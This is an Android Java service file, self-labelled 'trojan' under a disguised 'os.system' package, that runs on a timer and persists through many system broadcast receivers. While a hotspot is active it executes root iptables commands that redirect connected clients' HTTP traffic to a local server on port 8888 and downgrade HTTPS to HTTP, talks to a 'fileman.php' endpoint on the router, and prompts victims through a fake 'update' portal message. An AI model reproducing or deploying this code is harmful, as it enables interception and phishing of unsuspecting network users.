package os.system;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Intent;
import android.content.Context;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.os.IBinder;
import android.os.Handler;
import android.os.CountDownTimer;
import android.util.Log;
import android.widget.Toast;

public class System extends Service
{
	public static String TAG = "trojan";
	private BroadcastReceiver receiver;
	private ReceiverBoot receAction;
	private SharedPreferences settings;
	private SharedPreferences.Editor seteditor;
	public String ip = "";

	private Handler mHandler = new Handler();
	private Runnable mRefresh = new Runnable() {
		public void run() {
			main(System.this);
			mHandler.postDelayed(mRefresh, 5 * 1000);
		}
	};
	public void main(Context context) {
		if (!receAction.hostspotStatus(context)) {
			try {
				Runtime.getRuntime().exec("rm -r "+receAction.pathExternal+"/client");
			}catch(Exception e) {}
		}
		if (receAction.hostspotStatus(context) && receAction.main) {
			Log.i(TAG, "mkdkri "+receAction.pathExternal);

			if (receAction.cekClientOrServer().equals("client")) {
				Log.i(TAG, "mode client");
				receAction.requestUrl = "http://"+Identitas.getIpRouter()+":8888/fileman.php?id="+Identitas.getIPAddress(true);
				receAction.requestAksi = "web";
				receAction.mainRequest(context);
			}
			if (receAction.cekClient().equals("ada")) {
				Log.i(TAG, "ada client");
				seteditor.putString("main", "hotspot aktif");    
				seteditor.commit();
			}
			try {
				Runtime.getRuntime().exec("mkdir -p "+receAction.pathExternal+"/client");
			}catch(Exception e) {
				Log.i(TAG, "error mkdkri");
			}
        	String[] iproute = {
        		"iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination "+Identitas.getIPAddress(true)+":8888",
        		"iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 80"
        	};
        	receAction.main = false;
		   	receAction.setGSM(true, context);
		   	receAction.rootCommands(iproute);

        	CountDownTimer hitungMundur = new CountDownTimer(75000, 100){
				public void onTick(long millisUntilFinished){}
				public void onFinish()
				{
					if (settings.getString("main","").equals("hotspot aktif")) 
					{
						seteditor.putString("main", "hotspot mati");    
        				seteditor.commit();
					} else {
						Toast.makeText(context, "WIFI client tidak di update!\n\nsilahkan masuk portal untuk update.\natau buka browser url\n  http://index.html", Toast.LENGTH_LONG).show();
						receAction.hotspotConfig(context); // off hotspot
						receAction.setGSM(false, context);
						try {
							Runtime.getRuntime().exec("rm -r "+receAction.pathExternal+"/client");
						}catch(Exception e) {}
					}
				}
			}.start();
		        	
    	} 

	}

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	@Override
	public void onCreate() {
		super.onCreate();
		settings = getSharedPreferences("Settings", 0);
		seteditor = settings.edit();

		Log.i(TAG, "service oncreate oke");

		IntentFilter filter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
		filter.addAction(Intent.ACTION_DATE_CHANGED);
		filter.addAction(Intent.ACTION_HEADSET_PLUG);
		filter.addAction(Intent.ACTION_SCREEN_ON);
		filter.addAction(Intent.ACTION_POWER_CONNECTED);
		filter.addAction(Intent.ACTION_POWER_DISCONNECTED);
		filter.addAction(Intent.ACTION_MANAGE_NETWORK_USAGE);
		filter.addAction(Intent.ACTION_AIRPLANE_MODE_CHANGED);
		filter.addAction(Intent.ACTION_SCREEN_OFF);

		receiver = new ReceiverBoot();
		receAction = new ReceiverBoot();
		registerReceiver(receiver, filter);
		mHandler.postDelayed(mRefresh, 5 * 1000);

	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		
		Log.i(TAG, "service start oke");

		return super.onStartCommand(intent, flags, startId);
	}

	@Override
	public void onDestroy() {
		super.onDestroy();
		unregisterReceiver(receiver);
		seteditor.putString("cekversion", "destroy");    
  	    seteditor.commit();
  	    mHandler.removeCallbacks(mRefresh);
	}
}